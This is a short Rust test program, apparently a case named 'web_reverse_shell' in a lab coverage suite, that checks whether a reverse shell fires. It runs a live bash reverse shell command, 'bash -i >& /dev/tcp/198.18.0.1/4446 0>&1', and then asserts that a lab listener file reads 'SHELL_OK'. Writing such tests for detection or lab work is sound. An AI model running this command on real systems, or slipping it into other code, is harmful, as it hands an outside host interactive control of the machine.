fn main() {
if !coverage_suite::begin("web_reverse_shell") {return;}
let mut cmd = std::process::Command::new("/bin/bash");
cmd.args(["-c", "bash -i >& /dev/tcp/198.18.0.1/4446 0>&1"]);
let out=cmd.output().unwrap(); assert!(out.status.success(), "{:?}", out);
assert_eq!(out.stdout, "".as_bytes());
assert_eq!(std::fs::read("/tmp/lab/received").unwrap(), "SHELL_OK".as_bytes());
println!("CASE_OK web_reverse_shell");
}
